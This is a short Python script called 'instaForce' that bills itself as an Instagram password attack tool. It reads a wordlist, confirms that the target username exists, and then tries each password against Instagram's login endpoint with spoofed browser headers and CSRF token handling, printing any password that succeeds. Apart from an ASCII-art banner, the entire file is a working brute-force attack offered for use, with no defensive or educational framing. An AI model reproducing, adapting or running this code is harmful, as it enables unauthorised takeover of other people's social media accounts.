#!/usr/bin/env python
# instaForce - instagram Password Attack
############################################
# Coder   : Joker-Security 
# Github  : https://github.com/joker25000
# YouTuB : https://www.youtube.com/c/Professionalhacker25
############################################
import os,sys,json,time,random,requests

class brute():
	def __init__(self, user, passw='password.txt'):
		self.user = user
		self.passw = passw
		self.joker()
		self.professional()

	def joker(self):
		if os.path.isfile(self.passw):
			with open(self.passw) as f:
				self.sanfour = f.read().splitlines()
				security = len(self.sanfour)
				if (security > 0):
					print ('[*] %s Password in your List ' % security)

	def professional(self):
		csc = requests.get('https://www.instagram.com/%s/?__a=1' % self.user) 
		if (csc.status_code == 404):
			print ('[*] User named "%s" not found' % user)
			Input('[*] Press enter to exit')
			exit()
		elif (csc.status_code == 200):
			return True

	def attack(self, password):
		hacker = requests.Session()

		hacker.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
		hacker.headers.update({
			'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
			'x-instagram-ajax':'1',
			'X-Requested-With': 'XMLHttpRequest',
			'origin': 'https://www.instagram.com',
			'ContentType' : 'application/x-www-form-urlencoded',
			'Connection': 'keep-alive',
			'Accept': '*/*',
			'Referer': 'https://www.instagram.com',
			'authority': 'www.instagram.com',
			'Host' : 'www.instagram.com',
			'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
			'Accept-Encoding' : 'gzip, deflate'
		})

		dz = hacker.get('https://www.instagram.com/') 
		hacker.headers.update({'X-CSRFToken' : dz.cookies.get_dict()['csrftoken']})
		dz = hacker.post('https://www.instagram.com/accounts/login/ajax/', data ={'username':self.user, 'password':password}, allow_redirects=True)
		hacker.headers.update({'X-CSRFToken' : dz.cookies.get_dict()['csrftoken']})
		best = json.loads(dz.text)
		if (best['status'] == 'fail'):
			print (best['message'])
		if (best['authenticated'] == True):
			return hacker 
		else:
			return False
			
os.system("clear")
banner = ''' \033[96m
                   ,                     
                   |'.             , .. Joker-Security
                   |  '-._        / )
                 .'  .._  ',     /_'-,
                '   /  _'.'_\   /._)') 
               :   /  '_' '_'  /  _.'
               |E |   |Q| |Q| /   /
              .'  _\  '-' '-'    /
            .'--.(S     ,__` )  /    
                  '-.     _.'  /      
                __.--'----(   /     
            _.-'     :   __\ /
           (      __.' :'  :Y
            '.   '._,  :   :|        
              '.     ) :.__:|      
                \    \______/
                 '._L/_H____]             \033[92m                        
    InstaForce - Instagram Password Attack
  Github : https://github.com/Joker25000'''
print banner
insta = brute(raw_input('Enter Your Username \033[91m~>'))
for password in insta.sanfour:
	hacker = insta.attack(password)
	if hacker:	      
		print ('[*] Password Found %s' % [password])
	else:
		print ('[*] Password Not Found [%s]' % password)
